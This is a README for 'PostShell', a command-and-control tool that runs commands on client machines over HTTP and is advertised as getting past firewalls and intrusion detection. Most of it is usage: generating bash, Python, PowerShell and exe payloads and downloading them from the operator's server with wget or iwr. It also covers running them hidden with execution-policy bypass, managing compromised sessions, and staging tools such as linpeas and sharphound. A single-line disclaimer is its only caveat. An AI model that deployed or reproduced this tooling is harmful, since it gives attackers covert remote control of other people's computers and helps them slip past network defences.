```
██████╗  ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```
Execute Commands on Clients with HTTP. (Bypass Firewalls)

PostShell allows remote command execution on clients through standard HTTP GET and POST requests. 

This technique can help bypass firewalls and network restrictions that block typical reverse shells.

# Key Features:
  - Leverages HTTP requests to communicate, avoiding detection by firewalls or IDS/IPS systems.
  - Supports multiple client platforms (Bash, Ash, Python, PowerShell and Exe).
  - Logs all client sessions and outputs.

# How PostShell Works:
## Server Setup:
  - PostShell starts an HTTP server on a user-specified port.
  - A tools/ directory is created to host user generated client scripts.
## Client Script Generation:
  - PostShell generates the following client scripts:
    - Bash (.sh)
    - Ash (.sh)
    - Python (.py)
    - PowerShell (.ps1)
    - Executable (.exe)
  - These scripts are available for download/deployment:
    - Example: `http://<server_ip>:<port>/tools/<client.script>`
## Client Behavior:
  - The client script collects and submits system information via a POST request to the server.
  - Then enters a loop where it:
    - Sends GET requests to retrieve commands from the server.
    - Executes the commands locally.
    - Sends the command output back via POST.
## Logging:
  - All client interactions (commands and results) are saved in logs under the session_logs/ directory.

# Disclaimer
This is only for testing purposes, not intended for anything illegal.

# Getting Started
Download POSTSHELL
```
git clone https://github.com/bwithe/postshell
```

# Usage
## Start the server
```
python3 postshell.py <port>
```

## List commands
```
postshell> help 

Menu Commands:
    help | ?             - Show this menu
    payload              - Payload generator menu
    list                 - List connected sessions
    select <id>          - Connect to a session
    kill <id>            - Terminate session
    killall		 - Terminate all sessions
    exit                 - Exit the server
Session Commands:
    alias                - Set an alias for the current session
    list aliases         - List all aliases for the current session
    del alias            - Delete an alias for the current session
    background           - Background session
    die                  - Terminate session
Payload Menu Commands:
    set name <name>      - Set CUSTOM script name | BLANK = DEFAULT
    set lhost <ip>       - Set the POSTSHELL IP address
    set lport <port>     - Set the POSTSHELL listening port
    set payload <type>   - Set payload type (EX: sh, py, ps1, exe)
    set checkin <sec>    - Set the check-in wait time (in seconds)
    set killswitch <sec> - Exit payload if offline for N seconds
    options              - Show current payload configuration
    generate             - Generate the payload with current settings
    back                 - Return to the main menu
    help                 - Show this help menu

```

##  Generate a Client scripts
  - This creates a directory called "tools" with the scripts
  - This server also allows `GET` requests from `tools/`
  - You can also store other tools needed (ex: winpeas, linpeas, sharphound, etc)
```
postshell> payload 
payload> options 

Current Payload Options:

  NAME      : <NOT SET>
  LHOST     : 127.0.0.1
  LPORT     : 80
  PAYLOAD   : bash
  CHECKIN   : 1
  KILLSWITCH: 60

payload> set name client
[+] Set 'name' to 'client'
payload> set lhost 192.168.0.2
[+] Set 'lhost' to '192.168.0.2'
payload> set lport 4444
[+] Set 'lport' to '4444'
payload> set payload ps1
[+] Set 'payload' to 'ps1'
payload> set checkin 2
[+] Set 'checkin' to '2'
payload> set killswitch 10
[+] Set 'killswitch' to '10'
payload> options 

Current Payload Options:

  NAME      : client
  LHOST     : 192.168.0.2
  LPORT     : 4444
  PAYLOAD   : ps1
  CHECKIN   : 2
  KILLSWITCH: 10

payload> generate 
[+] Payload generated and saved as 'tools/client.ps1'
```

## Transfer the client scripts
```
wget http://127.0.0.1/tools/client.sh

iwr http://127.0.0.1/tools/client.ps1 -outfile client.ps1
```

## Execute the script on the client
```
/bin/ash client.sh

/bin/bash client.sh 

/bin/python3 client.py

powershell -ep bypass client.ps1

powershell -ep bypass -NoProfile -WindowStyle Hidden -File client.ps1
```

## List active clients
```
postshell> list 
╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
║ ID ║ IP              ║ HOSTNAME        ║ USER    ║ OS             ║ VERSION          ║ ARCH   ║
╠════╬═════════════════╬═════════════════╬═════════╬════════════════╬══════════════════╬════════╣
║ 1  ║ 192.168.193.131 ║ ubuntu          ║ clyde   ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ system  ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩══════════════════╩════════╝

postshell> list
╔════╦═════════════╦══════════╦═══════════╦══════════════════════════════╦════════════╦════════╗
║ ID ║ IP          ║ USER     ║ HOSTNAME  ║ OS                           ║ VERSION    ║ ARCH   ║
╠════╬═════════════╬══════════╬═══════════╬══════════════════════════════╬════════════╬════════╣
║ 1  ║ 172.16.12.3 ║ luke     ║ SKYWALKER ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
║ 2  ║ 172.16.12.2 ║ chewie   ║ WOOKIE    ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
║ 3  ║ 172.16.12.1 ║ han      ║ SOLO      ║ Windows Server 2025 Standard ║ 10.0.26100 ║ 64-bit ║
╚════╩═════════════╩══════════╩═══════════╩══════════════════════════════╩════════════╩════════╝

```

## Connect to an active session
```
postshell> select 1
[luke@SKYWALKER]> 
```

## Execute commands, and wait for the client to GET the command, then POST the results
```
[luke@SKYWALKER]> pwd

Path         
----         
C:\Users\Luke

```
  
## Background a session
```
[luke@SKYWALKER]> background
```

## Kill the current session
```
[chewie@WOOKIE]> die 
[!] Sent die command to chewie@WOOKIE
```

## Kill an active session from the menu
```
postshell> kill 1
[!] Sent kill command to luke@SKYWALKER
```

## Kill all sessions
```
postshell> killall
[!] Terminating all sessions.
```

## Exit POSTSHELL
```
postshell> exit 
[!] Shutting down server and all sessions.
```

## Alias creation, execution, and deletion
```
[root@kali]> alias duh='echo whoopsie'
[+] Alias 'duh' set to 'echo whoopsie' for session.
[root@kali]> list aliases 
[+] Active aliases for this session:
  duh => echo whoopsie
[root@kali]> duh
whoopsie
[root@kali]> del alias duh
[+] Alias 'duh' deleted for session.
[root@kali]> list aliases 
[*] No aliases set for this session.
```

# Logging
```
kali@kali:~/Desktop/postshell$ cat session_logs/root@kali_127.0.0.1.log

[2025-05-28 21:15:06] CMD: whoami
[2025-05-28 21:15:06] RESULT:
root

[2025-05-28 21:15:08] CMD: hostname
[2025-05-28 21:15:08] RESULT:
kali

[2025-05-28 21:15:42] CMD: pwd
[2025-05-28 21:15:42] RESULT:
/home/kali/Desktop/postshell

[2025-05-28 21:15:43] CMD: ls
[2025-05-28 21:15:43] RESULT:
postshell.py
README.md
session_logs
tools

[2025-05-28 21:16:07] CMD: whoami
[2025-05-28 21:16:07] RESULT:
root
```
